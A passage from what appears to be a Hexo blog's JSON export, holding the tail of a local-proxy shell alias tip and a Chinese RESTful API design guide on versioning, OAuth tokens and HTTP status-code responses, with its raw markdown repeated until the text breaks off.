all_proxy=http://127.0.0.1:1087</code></p>\n<hr>\n<p>更好的写法</p>\n<figure class=\"highlight monkey\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># 设置使用代理</span></span><br><span class=\"line\"><span class=\"keyword\">alias</span> <span class=\"title\">setproxy</span>=<span class=\"string\">\"export https_proxy=http://127.0.0.1:1087; export http_proxy=http://127.0.0.1:1087; export all_proxy=socks5://127.0.0.1:1086; echo 'Set proxy successfully'\"</span></span><br><span class=\"line\"><span class=\"meta\"># 设置取消使用代理</span></span><br><span class=\"line\"><span class=\"keyword\">alias</span> <span class=\"title\">unsetproxy</span>=<span class=\"string\">\"unset http_proxy; unset https_proxy; unset all_proxy; echo 'Unset proxy successfully'\"</span></span><br></pre></td></tr></table></figure>"},{"layout":"post","title":"RESETful API 设计规范","abbrlink":55580,"date":"2019-05-31T12:14:52.000Z","_content":"\n### 前言\n\n工欲善其事，必先利其器，一个健壮的API必要有优秀的设计规范，本文是最基本的设计理念\n\n<!--more-->\n\n### 协议\n\n在通过 API 于后端服务通信的过程中，应该 使用 HTTPS 协议。\n\n### API Root URL\n\nAPI 的根入口点应尽可能保持足够简单，这里有两个常见的 URL 根例子：\n\n```\napi.example.com/*\nexample.com/api/*\n```\n\n> 如果你的应用很庞大或者你预计它将会变的很庞大，那 应该 将 API 放到子域下。这种做法可以保持某些规模化上的灵活性。\n\n### Versioning\n\n所有的 API 必须保持向后兼容，你 必须 在引入新版本 API 的同时确保旧版本 API 仍然可用。所以 应该 为其提供版本支持。\n\n目前比较常见的两种版本号形式：\n\n在 URL 中嵌入版本编号\n```\napi.example.com/v1/*\n```\n这种做法是版本号直观、易于调试；另一种做法是，将版本号放在 HTTP Header 头中：\n通过媒体类型来指定版本信息\n```\nAccept: application/vnd.example.com.v1+json\n```\n\n其中 vnd 表示 Standards Tree 标准树类型，有三个不同的树: x，prs 和 vnd。你使用的标准树需要取决于你开发的项目\n\n- 未注册的树（x）主要表示本地和私有环境\n- 私有树（prs）主要表示没有商业发布的项目\n- 供应商树（vnd）主要表示公开发布的项目\n\n> 后面几个参数依次为应用名称（一般为应用域名）、版本号、期望的返回格式。\n\n### Endpoints\n\n端点就是指向特定资源或资源集合的 URL。在端点的设计中，你 必须 遵守下列约定:\n\n- URL 的命名 必须 全部小写\n- URL 中资源（resource）的命名 必须 是名词，并且 必须 是复数形式\n- 必须 优先使用 Restful 类型的 URL\n- URL 中不能出现 -，必须 用下划线 _ 代替\n- URL 必须 是易读的\n- URL 一定不可 暴露服务器架构\n\n### HTTP 动词\n\n对于资源的具体操作类型，由 HTTP 动词表示。常用的 HTTP 动词有下面五个（括号里是对应的 SQL 命令）。\n\n- GET（SELECT）：从服务器取出资源（一项或多项）。\n- POST（CREATE）：在服务器新建一个资源。\n- PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。\n- PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。\n- DELETE（DELETE）：从服务器删除资源。\n\n### Filtering\n\n> 如果记录数量很多，服务器不可能都将它们返回给用户。API 应该 提供参数，过滤返回结果。下面是一些常见的参数。\n\n- ?limit=10：指定返回记录的数量\n- ?offset=10：指定返回记录的开始位置。\n- ?page=2&per_page=100：指定第几页，以及每页的记录数。\n- ?sortby=name&order=asc：指定返回结果按照哪个属性排序，以及排序顺序。\n- ?animal_type_id=1：指定筛选条件\n\n所有 URL 参数 必须 是全小写，必须 使用下划线类型的参数形式。\n\n经常使用的、复杂的查询 应该 标签化，降低维护成本。如\n\n```\nGET /trades?status=closed&sort=sortby=name&order=asc\n# 可为其定制快捷方式\nGET /trades/recently_closed\n```\n\n### Authentication\n\n应该 使用 OAuth2.0 的方式为 API 调用者提供登录认证。必须 先通过登录接口获取 Access Token 后再通过该 token 调用需要身份认证的 API。\n\nOauth 的端点设计示列\n\n- RFC 6749   /token\n- Twitter    /oauth2/token\n- Fackbook   /oauth/access_token\n- Google     /o/oauth2/token\n- Github     /login/oauth/access_token\n- Instagram  /oauth/authorize\n\n客户端在获得 access token 的同时 必须 在响应中包含一个名为 expires_in 的数据，它表示当前获得的 token 会在多少 秒 后失效。\n\n```\n{\n    \"access_token\": \"token....\",\n    \"token_type\": \"Bearer\",\n    \"expires_in\": 3600\n}\n```\n\n客户端在请求需要认证的 API 时，必须 在请求头 Authorization 中带上 access_token。\n\n```\nAuthorization: Bearer token...\n```\n\n当超过指定的秒数后，access token 就会过期，再次用过期/或无效的 token 访问时，服务端 应该 返回 invalid_token 的错误或 401 错误码。\n\n```\nHTTP/1.1 401 Unauthorized\nContent-Type: application/json\nCache-Control: no-store\nPragma: no-cache\n\n{\n    \"error\": \"invalid_token\"\n}\n```\n\n> Laravel 开发中，应该 使用 JWT 来为管理你的 Token，并且 一定不可 在 api 中间件中开启请求 session。\n\n### Response\n\n所有的 API 响应，必须 遵守 HTTP 设计规范，必须 选择合适的 HTTP 状态码。一定不可 所有接口都返回状态码为 200 的 HTTP 响应，如:\n\n```\nHTTP/1.1 200 ok\nContent-Type: application/json\nServer: example.com\n\n{\n    \"code\": 0,\n    \"msg\": \"success\",\n    \"data\": {\n        \"username\": \"username\"\n    }\n}\n```\n\n常见的 HTTP 状态码\n\n状态码 | 描述\n-------|-----\n1xx    | 代表请求已被接受，需要继续处理\n2xx    | 请求已成功，请求所希望的响应头或数据体将随此响应返回\n3xx    | 重定向\n4xx    | 客户端引起的错误\n5xx    | 服务端引起的错误\n\n> 只有来自客户端的请求被正确的处理后才能返回 2xx 的响应，所以当 API 返回 2xx 类型的状态码时，前端 必须 认定该请求已处理成功。\n\n必须强调的是，所有 API 一定不可 返回 1xx 类型的状态码。当 API 发生错误时，必须 返回出错时的详细信息。目前常见返回错误信息的方法有两种：\n\n1、将错误详细放入 HTTP 响应首部；\n\n```\nX-MYNAME-ERROR-CODE: 4001\nX-MYNAME-ERROR-MESSAGE: Bad authentication token\nX-MYNAME-ERROR-INFO: http://docs.example.com/api/v1/authentication\n```\n\n2、直接放入响应实体中；\n\n```\nHTTP/1.1 401 Unauthorized\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 10:02:59 GMT\nConnection: keep-alive\n\n{\"error_code\":40100,\"message\":\"Unauthorized\"}\n```\n\n考虑到易读性和客户端的易处理性，我们 必须 把错误信息直接放到响应实体中，并且错误格式 应该 满足如下格式：\n```\n{\n    \"message\": \"您查找的资源不存在\",\n    \"error_code\": 404001\n}\n```\n\n其中错误码（error_code）必须 和 HTTP 状态码对应，也方便错误码归类，如：\n\n```\nHTTP/1.1 429 Too Many Requests\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 10:15:52 GMT\nConnection: keep-alive\n\n{\"error_code\":429001,\"message\":\"你操作太频繁了\"}\n```\n\n应该 在返回的错误信息中，同时包含面向开发者和面向用户的提示信息，前者可方便开发人员调试，后者可直接展示给终端用户查看如：\n\n```\n{\n    \"message\": \"直接展示给终端用户的错误信息\",\n    \"error_code\": \"业务错误码\",\n    \"error\": \"供开发者查看的错误信息\",\n    \"debug\": [\n        \"错误堆栈，必须开启 debug 才存在\"\n    ]\n}\n```\n\n下面详细列举了各种情况 API 的返回说明。\n\n### 200 ok\n\n```\n200 状态码是最常见的 HTTP 状态码，在所有 成功 的 GET 请求中，必须 返回此状态码。HTTP 响应实体部分 必须 直接就是数据，不要做多余的包装。\n\n{\n    \"data\": [\n        {\n            \"id\": 1,\n            \"avatar\": \"https://lorempixel.com/640/480/?32556\",\n            \"nickname\": \"fwest\",\n            \"last_logined_time\": \"2018-05-29 04:56:43\",\n            \"has_registed\": true\n        },\n        {\n            \"id\": 2,\n            \"avatar\": \"https://lorempixel.com/640/480/?86144\",\n            \"nickname\": \"zschowalter\",\n            \"last_logined_time\": \"2018-06-16 15:18:34\",\n            \"has_registed\": true\n        }\n    ],\n    \"meta\": {\n        \"pagination\": {\n            \"total\": 101,\n            \"count\": 2,\n            \"per_page\": 2,\n            \"current_page\": 1,\n            \"total_pages\": 51,\n            \"links\": {\n                \"next\": \"http://api.example.com?page=2\"\n            }\n        }\n    }\n}\n```\n\n> 其中，分页和其他额外的媒体信息，必须放到 meta 字段中。\n\n### 201 Created\n\n当服务器创建数据成功时，应该 返回此状态码。常见的应用场景是使用 POST 提交用户信息，如：\n\n- 添加了新用户\n- 上传了图片\n- 创建了新活动\n\n等，都可以返回 201 状态码。需要注意的是，你可以选择在用户创建成功后返回新用户的数据\n\n```\nHTTP/1.1 201 Created\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nDate: Sun, 24 Jun 2018 09:13:40 GMT\nConnection: keep-alive\n\n{\n    \"id\": 1,\n    \"avatar\": \"https:\\/\\/lorempixel.com\\/640\\/480\\/?32556\",\n    \"nickname\": \"fwest\",\n    \"last_logined_time\": \"2018-05-29 04:56:43\",\n    \"created_at\": \"2018-06-16 17:55:55\",\n    \"updated_at\": \"2018-06-16 17:55:55\"\n}\n```\n\n也可以返回一个响应实体为空的 HTTP Response 如：\n\n```\nHTTP/1.1 201 Created\nServer: nginx/1.11.9\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nDate: Sun, 24 Jun 2018 09:12:20 GMT\nConnection: keep-alive\n```\n\n> 这里我们 应该 采用第二种方式，因为大多数情况下，客户端只需要知道该请求操作成功与否，并不需要返回新资源的信息。\n\n### 202 Accepted\n\n该状态码表示服务器已经接受到了来自客户端的请求，但还未开始处理。常用短信发送、邮件通知、模板消息推送等这类很耗时需要队列支持的场景中；\n\n> 返回该状态码时，响应实体 必须 为空。\n\n```\nHTTP/1.1 202 Accepted\nServer: nginx/1.11.9\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nDate: Sun, 24 Jun 2018 09:25:15 GMT\nConnection: keep-alive\n```\n\n### 204 No Content\n\n该状态码表示响应实体不包含任何数据，其中：\n\n在使用 DELETE 方法删除资源 成功 时，必须 返回该状态码\n使用 PUT、PATCH 方法更新数据 成功 时，也 应该 返回此状态码\n\n```\nHTTP/1.1 204 No Content\nServer: nginx/1.11.9\nDate: Sun, 24 Jun 2018 09:29:12 GMT\nConnection: keep-alive\n```\n\n### 3xx 重定向\n\n所有 API 一定不可 返回 3xx 类型的状态码。因为 3xx 类型的响应格式一般为下列格式:\n\n```\nHTTP/1.1 302 Found\nServer: nginx/1.11.9\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 09:41:50 GMT\nLocation: https://example.com\nConnection: keep-alive\n\n<!DOCTYPE html>\n<html>\n    <head>\n        <meta charset=\"UTF-8\" />\n        <meta http-equiv=\"refresh\" content=\"0;url=https://example.com\" />\n\n        <title>Redirecting to https://example.com</title>\n    </head>\n    <body>\n        Redirecting to <a href=\"https://example.com\">https://example.com</a>.\n    </body>\n</html>\n```\n\nAPI 一定不可 返回纯 HTML 结构的响应；若一定要使用重定向功能，应该 返回一个响应实体为空的 3xx 响应，并在响应头中加上 Location 字段:\n\n```\nHTTP/1.1 302 Found\nServer: nginx/1.11.9\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nDate: Sun, 24 Jun 2018 09:52:50 GMT\nLocation: https://godruoyi.com\nConnection: keep-alive\n```\n\n### 400 Bad Request\n\n由于明显的客户端错误（例如，请求语法格式错误、无效的请求、无效的签名等），服务器 应该 放弃该请求。\n\n> 当服务器无法从其他 4xx 类型的状态码中找出合适的来表示错误类型时，都 必须 返回该状态码。\n\n```\nHTTP/1.1 400 Bad Request\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 13:22:36 GMT\nConnection: keep-alive\n\n{\"error_code\":40000,\"message\":\"无效的签名\"}\n```\n\n### 401 Unauthorized\n\n该状态码表示当前请求需要身份认证，以下情况都 必须 返回该状态码。\n\n- 未认证用户访问需要认证的 API\n- access_token 无效/过期\n- 客户端在收到 401 响应后，都 应该 提示用户进行下一步的登录操作。\n\n```\nHTTP/1.1 401 Unauthorized\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nWWW-Authenticate: JWTAuth\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 13:17:02 GMT\nConnection: keep-alive\n\n\"message\":\"Token Signature could not be verified.\",\"error_code\": \"40100\"}\n```\n\n### 403 Forbidden\n\n该状态码可以简单的理解为没有权限访问该请求，服务器收到请求但拒绝提供服务。\n\n如当普通用户请求操作管理员用户时，必须 返回该状态码。\n\n```\nHTTP/1.1 403 Forbidden\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 13:05:34 GMT\nConnection: keep-alive\n\n{\"error_code\":40301,\"message\":\"权限不足\"}\n```\n\n### 404 Not Found\n\n该状态码表示用户请求的资源不存在，如\n\n- 获取不存在的用户信息 （get /users/9999999）\n- 访问不存在的端点\n\n都 必须 返回该状态码，若该资源已永久不存在，则 应该 返回 401 响应。\n\n### 405 Method Not Allowd\n\n当客户端使用的 HTTP 请求方法不被服务器允许时，必须 返回该状态码。\n\n> 如客户端调用了 POST 方法来访问只支持 GET 方法的 API\n\n该响应 必须 返回一个 Allow 头信息用以表示出当前资源能够接受的请求方法的列表。\n\n```\nHTTP/1.1 405 Method Not Allowed\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nAllow: GET, HEAD\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 12:30:57 GMT\nConnection: keep-alive\n\n{\"message\":\"405 Method Not Allowed\",\"error_code\": 40500}\n```\n\n### 406 Not Acceptable\n\nAPI 在不支持客户端指定的数据格式时，应该返回此状态码。如支持 JSON 和 XML 输出的 API 被指定返回 YAML 格式的数据时。\n\n> Http 协议一般通过请求首部的 Accept 来指定数据格式\n\n### 408 Request Timeout\n\n客户端请求超时时 必须 返回该状态码，需要注意的时，该状态码表示 客户端请求超时，在涉及第三方 API 调用超时时，一定不可 返回该状态码。\n\n### 409 Gonfilct\n\n该状态码表示因为请求存在冲突无法处理。如通过手机号码提供注册功能的 API，当用户提交的手机号已存在时，必须 返回此状态码。\n\n```\nHTTP/1.1 409 Conflict\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 12:19:04 GMT\nConnection: keep-alive\n\n{\"error_code\":40900,\"message\":\"手机号已存在\"}\n```\n\n### 410 Gone\n\n和 404 类似，该状态码也表示请求的资源不存在，只是 410 状态码进一步表示所请求的资源已不存在，并且未来也不会存在。在收到 410 状态码后，客户端 应该 停止再次请求该资源。\n\n### 413 Request Entity Too Large\n\n该状态码表示服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。\n\n> 此种情况下，服务器可以关闭连接以免客户端继续发送此请求。\n\n如果这个状况是临时的，服务器 应该 返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试。\n\n### 414 Request-URI Too Long\n\n该状态码表示请求的 URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。\n\n### 415 Unsupported Media Type\n\n通常表示服务器不支持客户端请求首部 Content-Type 指定的数据格式。如在只接受 JSON 格式的 API 中放入 XML 类型的数据并向服务器发送，都 应该 返回该状态码。\n\n该状态码也可用于如：只允许上传图片格式的文件，但是客户端提交媒体文件非法或不是图片类型，这时 应该 返回该状态码：\n\n```\nHTTP/1.1 415 Unsupported Media Type\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 12:09:40 GMT\nConnection: keep-alive\n\n{\"error_code\":41500,\"message\":\"不允许上传的图片格式\"}\n```\n\n### 429 Too Many Request\n\n该状态码表示用户请求次数超过允许范围。如 API 设定为 60次/分钟，当用户在一分钟内请求次数超过 60 次后，都 应该 返回该状态码。并且也 应该 在响应首部中加上下列头部：\n\n```\nX-RateLimit-Limit: 10 请求速率（由应用设定，其单位一般为小时/分钟等，这里是 10次/5分钟）\nX-RateLimit-Remaining: 0 当前剩余的请求数量\nX-RateLimit-Reset: 1529839462 重置时间\nRetry-After: 120 下一次访问应该等待的时间（秒）\n```\n\n列子\n\n```\nHTTP/1.1 429 Too Many Requests\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nX-RateLimit-Limit: 10\nX-RateLimit-Remaining: 0\nX-RateLimit-Reset: 1529839462\nRetry-After: 290\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 11:19:32 GMT\nConnection: keep-alive\n\n{\"message\":\"You have exceeded your rate limit.\",\"error_code\":42900}\n```\n\n必须 为所有的 API 设置 Rate Limit 支持。\n\n### 500 Internal Server Error\n\n该状态码 必须 在服务器出错时抛出，对于所有的 500 错误，都 应该 提供完整的错误信息支持，也方便跟踪调试。\n\n### 503 Service Unavailable\n\n该状态码表示服务器暂时处理不可用状态，当服务器需要维护或第三方 API 请求超时/不可达时，都 应该 返回该状态码，其中若是主动关闭 API 服务，应该在返回的响应首部加上 Retry-After 头部，表示多少秒后可以再次访问。\n\n```\nHTTP/1.1 503 Service Unavailable\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 10:56:20 GMT\nRetry-After: 60\nConnection: keep-alive\n\n{\"error_code\":50300,\"message\":\"服务维护中\"}\n```\n\n其他 HTTP 状态码请参考 [HTTP 状态码- 维基百科](https://link.juejin.im/?target=https%3A%2F%2Fzh.wikipedia.org%2Fzh-hans%2FHTTP%25E7%258A%25B6%25E6%2580%2581%25E7%25A0%2581)。\n","source":"_posts/2019/6/RESETfulAPI设计规范.md","raw":"---\nlayout: post\ntitle: RESETful API 设计规范\ntags:\n  - api\ncategories:\n  - api\nabbrlink: 55580\ndate: 2019-05-31 20:14:52\n---\n\n### 前言\n\n工欲善其事，必先利其器，一个健壮的API必要有优秀的设计规范，本文是最基本的设计理念\n\n<!--more-->\n\n### 协议\n\n在通过 API 于后端服务通信的过程中，应该 使用 HTTPS 协议。\n\n### API Root URL\n\nAPI 的根入口点应尽可能保持足够简单，这里有两个常见的 URL 根例子：\n\n```\napi.example.com/*\nexample.com/api/*\n```\n\n> 如果你的应用很庞大或者你预计它将会变的很庞大，那 应该 将 API 放到子域下。这种做法可以保持某些规模化上的灵活性。\n\n### Versioning\n\n所有的 API 必须保持向后兼容，你 必须 在引入新版本 API 的同时确保旧版本 API 仍然可用。所以 应该 为其提供版本支持。\n\n目前比较常见的两种版本号形式：\n\n在 URL 中嵌入版本编号\n```\napi.example.com/v1/*\n```\n这种做法是版本号直观、易于调试；另一种做法是，将版本号放在 HTTP Header 头中：\n通过媒体类型来指定版本信息\n```\nAccept: application/vnd.example.com.v1+json\n```\n\n其中 vnd 表示 Standards Tree 标准树类型，有三个不同的树: x，prs 和 vnd。你使用的标准树需要取决于你开发的项目\n\n- 未注册的树（x）主要表示本地和私有环境\n- 私有树（prs）主要表示没有商业发布的项目\n- 供应商树（vnd）主要表示公开发布的项目\n\n> 后面几个参数依次为应用名称（一般为应用域名）、版本号、期望的返回格式。\n\n### Endpoints\n\n端点就是指向特定资源或资源集合的 URL。在端点的设计中，你 必须 遵守下列约定:\n\n- URL 的命名 必须 全部小写\n- URL 中资源（resource）的命名 必须 是名词，并且 必须 是复数形式\n- 必须 优先使用 Restful 类型的 URL\n- URL 中不能出现 -，必须 用下划线 _ 代替\n- URL 必须 是易读的\n- URL 一定不可 暴露服务器架构\n\n### HTTP 动词\n\n对于资源的具体操作类型，由 HTTP 动词表示。常用的 HTTP 动词有下面五个（括号里是对应的 SQL 命令）。\n\n- GET（SELECT）：从服务器取出资源（一项或多项）。\n- POST（CREATE）：在服务器新建一个资源。\n- PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。\n- PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。\n- DELETE（DELETE）：从服务器删除资源。\n\n### Filtering\n\n> 如果记录数量很多，服务器不可能都将它们返回给用户。API 应该 提供参数，过滤返回结果。下面是一些常见的参数。\n\n- ?limit=10：指定返回记录的数量\n- ?offset=10：指定返回记录的开始位置。\n- ?page=2&per_page=100：指定第几页，以及每页的记录数。\n- ?sortby=name&order=asc：指定返回结果按照哪个属性排序，以及排序顺序。\n- ?animal_type_id=1：指定筛选条件\n\n所有 URL 参数 必须 是全小写，必须 使用下划线类型的参数形式。\n\n经常使用的、复杂的查询 应该 标签化，降低维护成本。如\n\n```\nGET /trades?status=closed&sort=sortby=name&order=asc\n# 可为其定制快捷方式\nGET /trades/recently_closed\n```\n\n### Authentication\n\n应该 使用 OAuth2.0 的方式为 API 调用者提供登录认证。必须 先通过登录接口获取 Access Token 后再通过该 token 调用需要身份认证的 API。\n\nOauth 的端点设计示列\n\n- RFC 6749   /token\n- Twitter    /oauth2/token\n- Fackbook   /oauth/access_token\n- Google     /o/oauth2/token\n- Github     /login/oauth/access_token\n- Instagram  /oauth/authorize\n\n客户端在获得 access token 的同时 必须 在响应中包含一个名为 expires_in 的数据，它表示当前获得的 token 会在多少 秒 后失效。\n\n```\n{\n    \"access_token\": \"token....\",\n    \"token_type\": \"Bearer\",\n    \"expires_in\": 3600\n}\n```\n\n客户端在请求需要认证的 API 时，必须 在请求头 Authorization 中带上 access_token。\n\n```\nAuthorization: Bearer token...\n```\n\n当超过指定的秒数后，access token 就会过期，再次用过期/或无效的 token 访问时，服务端 应该 返回 invalid_token 的错误或 401 错误码。\n\n```\nHTTP/1.1 401 Unauthorized\nContent-Type: application/json\nCache-Control: no-store\nPragma: no-cache\n\n{\n    \"error\": \"invalid_token\"\n}\n```\n\n> Laravel 开发中，应该 使用 JWT 来为管理你的 Token，并且 一定不可 在 api 中间件中开启请求 session。\n\n### Response\n\n所有的 API 响应，必须 遵守 HTTP 设计规范，必须 选择合适的 HTTP 状态码。一定不可 所有接口都返回状态码为 200 的 HTTP 响应，如:\n\n```\nHTTP/1.1 200 ok\nContent-Type: application/json\nServer: example.com\n\n{\n    \"code\": 0,\n    \"msg\": \"success\",\n    \"data\": {\n        \"username\": \"username\"\n    }\n}\n```\n\n常见的 HTTP 状态码\n\n状态码 | 描述\n-------|-----\n1xx    | 代表请求已被接受，需要继续处理\n2xx    | 请求已成功，请求所希望的响应头或数据体将随此响应返回\n3xx    | 重定向\n4xx    | 客户端引起的错误\n5xx    | 服务端引起的错误\n\n> 只有来自客户端的请求被正确的处理后才能返回 2xx 的响应，所以当 API 返回 2xx 类型的状态码时，前端 必须 认定该请求已处理成功。\n\n必须强调的是，所有 API 一定不可 返回 1xx 类型的状态码。当 API 发生错误时，必须 返回出错时的详细信息。目前常见返回错误信息的方法有两种：\n\n1、将错误详细放入 HTTP 响应首部；\n\n```\nX-MYNAME-ERROR-CODE: 4001\nX-MYNAME-ERROR-MESSAGE: Bad authentication token\nX-MYNAME-ERROR-INFO: http://docs.example.com/api/v1/authentication\n```\n\n2、直接放入响应实体中；\n\n```\nHTTP/1.1 401 Unauthorized\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 10:02:59 GMT\nConnection: keep-alive\n\n{\"error_code\":40100,\"message\":\"Unauthorized\"}\n```\n\n考虑到易读性和客户端的易处理性，我们 必须 把错误信息直接放到响应实体中，并且错误格式 应该 满足如下格式：\n```\n{\n    \"message\": \"您查找的资源不存在\",\n    \"error_code\": 404001\n}\n```\n\n其中错误码（error_code）必须 和 HTTP 状态码对应，也方便错误码归类，如：\n\n```\nHTTP/1.1 429 Too Many Requests\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 10:15:52 GMT\nConnection: keep-alive\n\n{\"error_code\":429001,\"message\":\"你操作太频繁了\"}\n```\n\n应该 在返回的错误信息中，同时包含面向开发者和面向用户的提示信息，前者可方便开发人员调试，后者可直接展示给终端用户查看如：\n\n```\n{\n    \"message\": \"直接展示给终端用户的错误信息\",\n    \"error_code\": \"业务错误码\",\n    \"error\": \"供开发者查看的错误信息\",\n    \"debug\": [\n        \"错误堆栈，必须开启 debug 才存在\"\n    ]\n}\n```\n\n下面详细列举了各种情况 API 的返回说明。\n\n### 200 ok\n\n```\n200 状态码是最常见的 HTTP 状态码，在所有 成功 的 GET 请求中，必须 返回此状态码。HTTP 响应实体部分 必须 直接就是数据，不要做多余的包装。\n\n{\n    \"data\": [\n        {\n            \"id\": 1,\n            \"avatar\": \"https://lorempixel.com/640/480/?32556\",\n            \"nickname\": \"fwest\",\n            \"last_logined_time\": \"2018-05-29 04:56:43\",\n            \"has_registed\": true\n        },\n        {\n            \"id\": 2,\n            \"avatar\": \"https://lorempixel.com/640/480/?86144\",\n            \"nickname\": \"zschowalter\",\n            \"last_logined_time\": \"2018-06-16 15:18:34\",\n            \"has_registed\": true\n        }\n    ],\n    \"meta\": {\n        \"pagination\": {\n            \"total\": 101,\n            \"count\": 2,\n            \"per_page\": 2,\n            \"current_page\": 1,\n            \"total_pages\": 51,\n            \"links\": {\n                \"next\": \"http://api.example.com?page=2\"\n            }\n        }\n    }\n}\n```\n\n> 其中，分页和其他额外的媒体信息，必须放到 meta 字段中。\n\n### 201 Created\n\n当服务器创建数据成功时，应该 返回此状态码。常见的应用场景是使用 POST 提交用户信息，如：\n\n- 添加了新用户\n- 上传了图片\n- 创建了新活动\n\n等，都可以返回 201 状态码。需要注意的是，你可以选择在用户创建成功后返回新用户的数据\n\n```\nHTTP/1.1 201 Created\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nDate: Sun, 24 Jun 2018 09:13:40 GMT\nConnection: keep-alive\n\n{\n    \"id\": 1,\n    \"avatar\": \"https:\\/\\/lorempixel.com\\/640\\/480\\/?32556\",\n    \"nickname\": \"fwest\",\n    \"last_logined_time\": \"2018-05-29 04:56:43\",\n    \"created_at\": \"2018-06-16 17:55:55\",\n    \"updated_at\": \"2018-06-16 17:55:55\"\n}\n```\n\n也可以返回一个响应实体为空的 HTTP Response 如：\n\n```\nHTTP/1.1 201 Created\nServer: nginx/1.11.9\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nDate: Sun, 24 Jun 2018 09:12:20 GMT\nConnection: keep-alive\n```\n\n> 这里我们 应该 采用第二种方式，因为大多数情况下，客户端只需要知道该请求操作成功与否，并不需要返回新资源的信息。\n\n### 202 Accepted\n\n该状态码表示服务器已经接受到了来自客户端的请求，但还未开始处理。常用短信发送、邮件通知、模板消息推送等这类很耗时需要队列支持的场景中；\n\n> 返回该状态码时，响应实体 必须 为空。\n\n```\nHTTP/1.1 202 Accepted\nServer: nginx/1.11.9\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nDate: Sun, 24 Jun 2018 09:25:15 GMT\nConnection: keep-alive\n```\n\n### 204 No Content\n\n该状态码表示响应实体不包含任何数据，其中：\n\n在使用 DELETE 方法删除资源 成功 时，必须 返回该状态码\n使用 PUT、PATCH 方法更新数据 成功 时，也 应该 返回此状态码\n\n```\nHTTP/1.1 204 No Content\nServer: nginx/1.11.9\nDate: Sun, 24 Jun 2018 09:29:12 GMT\nConnection: keep-alive\n```\n\n### 3xx 重定向\n\n所有 API 一定不可 返回 3xx 类型的状态码。因为 3xx 类型的响应格式一般为下列格式:\n\n```\nHTTP/1.1 302 Found\nServer: nginx/1.11.9\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 09:41:50 GMT\nLocation: https://example.com\nConnection: keep-alive\n\n<!DOCTYPE html>\n<html>\n    <head>\n        <meta charset=\"UTF-8\" />\n        <meta http-equiv=\"refresh\" content=\"0;url=https://example.com\" />\n\n        <title>Redirecting to https://example.com</title>\n    </head>\n    <body>\n        Redirecting to <a href=\"https://example.com\">https://example.com</a>.\n    </body>\n</html>\n```\n\nAPI 一定不可 返回纯 HTML 结构的响应；若一定要使用重定向功能，应该 返回一个响应实体为空的 3xx 响应，并在响应头中加上 Location 字段:\n\n```\nHTTP/1.1 302 Found\nServer: nginx/1.11.9\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nDate: Sun, 24 Jun 2018 09:52:50 GMT\nLocation: https://godruoyi.com\nConnection: keep-alive\n```\n\n### 400 Bad Request\n\n由于明显的客户端错误（例如，请求语法格式错误、无效的请求、无效的签名等），服务器 应该 放弃该请求。\n\n> 当服务器无法从其他 4xx 类型的状态码中找出合适的来表示错误类型时，都 必须 返回该状态码。\n\n```\nHTTP/1.1 400 Bad Request\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 13:22:36 GMT\nConnection: keep-alive\n\n{\"error_code\":40000,\"message\":\"无效的签名\"}\n```\n\n### 401 Unauthorized\n\n该状态码表示当前请求需要身份认证，以下情况都 必须 返回该状态码。\n\n- 未认证用户访问需要认证的 API\n- access_token 无效/过期\n- 客户端在收到 401 响应后，都 应该 提示用户进行下一步的登录操作。\n\n```\nHTTP/1.1 401 Unauthorized\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: 